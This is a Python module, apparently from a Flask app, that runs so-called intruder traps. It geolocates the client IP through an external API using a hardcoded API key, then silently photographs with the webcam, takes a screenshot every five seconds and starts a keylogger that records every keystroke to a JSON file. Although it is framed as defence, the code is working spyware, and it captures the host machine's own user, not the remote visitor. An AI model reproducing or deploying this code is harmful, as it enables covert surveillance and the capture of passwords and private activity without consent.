import os
import json
import csv
import cv2
import time
import requests
import pyautogui
import threading
import re
from datetime import datetime
from pynput import keyboard
from flask import request

# Define Directories
BASE_DIR = os.getcwd()
LOGS_DIR = os.path.join(BASE_DIR, "logs")
CAPTURE_DIR = os.path.join(BASE_DIR, "Capture")
INTRUDER_DIR = os.path.join(CAPTURE_DIR, "intruder")  # Stores intruder images
SCREENSHOT_DIR = os.path.join(CAPTURE_DIR, "screenshots")  # Stores screenshots
INTRUDER_LOG_FILE = os.path.join(LOGS_DIR, "intruder_log.csv")
KEYLOG_JSON_FILE = os.path.join(LOGS_DIR, "key_logs.json")

# Ensure Directories Exist
for directory in [LOGS_DIR, INTRUDER_DIR, SCREENSHOT_DIR]:
    os.makedirs(directory, exist_ok=True)

# ✅ Track already captured intruders (to prevent duplicate captures)
captured_intruders = set()

# ✅ Initialize CSV with Headers
def initialize_csv():
    """Creates CSV files with headers if they don't exist."""
    if not os.path.exists(INTRUDER_LOG_FILE):
        with open(INTRUDER_LOG_FILE, mode="w", newline="") as file:
            writer = csv.writer(file)
            writer.writerow(["Timestamp", "IP", "City", "State", "Country", "Latitude", "Longitude", "ISP"])
        print(f"✅ Initialized {INTRUDER_LOG_FILE} with headers.")

# ✅ Get Real Public IP Address
def get_real_ip():
    """Retrieves the user's public IPv4 address."""
    try:
        if request.headers.get('X-Forwarded-For'):
            client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
        else:
            client_ip = request.remote_addr  

        private_ip_ranges = ["192.168.", "10.", "127.", "172."]
        if any(client_ip.startswith(prefix) for prefix in private_ip_ranges) or client_ip == "127.0.0.1":
            response = requests.get("https://api64.ipify.org?format=json")
            client_ip = response.json().get("ip", "Unknown")

        return client_ip
    except Exception as e:
        print(f"⚠ Error getting real IPv4: {e}")
        return "Unknown"

# ✅ Get Geolocation Data
def get_geolocation(ip_address):
    """Fetches geolocation data based on the IP address."""
    API_KEY = "f02c382355a542aaaedf29c6fe7352c4"  # Replace with your actual API key
    try:
        url = f"https://api.ipgeolocation.io/ipgeo?apiKey={API_KEY}&ip={ip_address}"
        response = requests.get(url)
        data = response.json()

        return {
            "city": data.get("city", "Unknown"),
            "region": data.get("state_prov", "Unknown"),
            "country": data.get("country_name", "Unknown"),
            "latitude": str(data.get("latitude", "Unknown")),
            "longitude": str(data.get("longitude", "Unknown")),
            "isp": data.get("isp", "Unknown")
        }
    except Exception as e:
        print(f"⚠ Error fetching geolocation data: {e}")
        return {
            "city": "Unknown",
            "region": "Unknown",
            "country": "Unknown",
            "latitude": "Unknown",
            "longitude": "Unknown",
            "isp": "Unknown"
        }

# ✅ Log Intruder to CSV
def log_intruder(ip_address, location_data):
    """Logs intruder details in the CSV file."""
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    row_data = [
        timestamp,
        ip_address,
        location_data.get("city", "Unknown"),
        location_data.get("region", "Unknown"),
        location_data.get("country", "Unknown"),
        location_data.get("latitude", "Unknown"),
        location_data.get("longitude", "Unknown"),
        location_data.get("isp", "Unknown")
    ]

    # Write to CSV
    with open(INTRUDER_LOG_FILE, mode="a", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(row_data)
    print(f"🔴 Intruder Logged: {row_data}")

# ✅ Sanitize IP for Filenames
def sanitize_ip(ip_address):
    return re.sub(r'[^\w]', '_', ip_address)

# ✅ Capture Intruder Image (Only Once Per Intruder)
def capture_intruder_image(ip_address):
    """Captures intruder image using the webcam (only once per intruder)."""
    if ip_address in captured_intruders:
        return None  # Prevent multiple captures

    sanitized_ip = sanitize_ip(ip_address)
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("⚠ Error: Could not open the camera.")
        return None

    ret, frame = cap.read()
    cap.release()

    if ret:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"intruder_{sanitized_ip}_{timestamp}.jpg"
        filepath = os.path.join(INTRUDER_DIR, filename)
        
        cv2.imwrite(filepath, frame)
        print(f"📸 Intruder Image Captured: {filepath}")
        captured_intruders.add(ip_address)  # ✅ Store intruder session
        return filename
    else:
        print("⚠ Error: Failed to capture an image.")
        return None

# ✅ Capture Screenshots Every 5 Seconds
def capture_screenshots(ip_address):
    """Captures screenshots continuously every 5 seconds."""
    sanitized_ip = sanitize_ip(ip_address)
    while True:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{sanitized_ip}_{timestamp}.png"
        filepath = os.path.join(SCREENSHOT_DIR, filename)
        
        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)
        print(f"🖼 Screenshot Saved: {filepath}")

        time.sleep(5)  # Capture every 5 seconds

# ✅ Keylogger with JSON Storage
class Keylogger:
    def __init__(self):
        self.log_file = KEYLOG_JSON_FILE
        self.logs = self.load_logs()

    def load_logs(self):
        """Loads existing logs from JSON or creates a new log structure."""
        if os.path.exists(self.log_file):
            with open(self.log_file, "r") as f:
                return json.load(f)
        return {}

    def save_logs(self):
        """Writes the keylogs to JSON file."""
        with open(self.log_file, "w") as f:
            json.dump(self.logs, f, indent=4)

    def on_press(self, key):
        """Logs pressed keys in a JSON format."""
        try:
            key_str = key.char.upper() if hasattr(key, 'char') else f"[{str(key).replace('Key.', '').upper()}]"
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            if timestamp not in self.logs:
                self.logs[timestamp] = []
            self.logs[timestamp].append(key_str)

            self.save_logs()
        except Exception as e:
            print(f"⚠ Keylogger Error: {e}")

    def start(self):
        """Starts the keylogger in a separate thread."""
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()
        print(f"⌨ Keylogger started: {self.log_file}")

# ✅ Execute Traps (Only Once Per Intruder)
def execute_traps():
    ip_address = get_real_ip()
    if ip_address in captured_intruders:
        return  

    print("🚨 Intruder detected! Executing traps...")
    location_data = get_geolocation(ip_address)
    log_intruder(ip_address, location_data)
    capture_intruder_image(ip_address)
    threading.Thread(target=capture_screenshots, args=(ip_address,), daemon=True).start()
    Keylogger().start()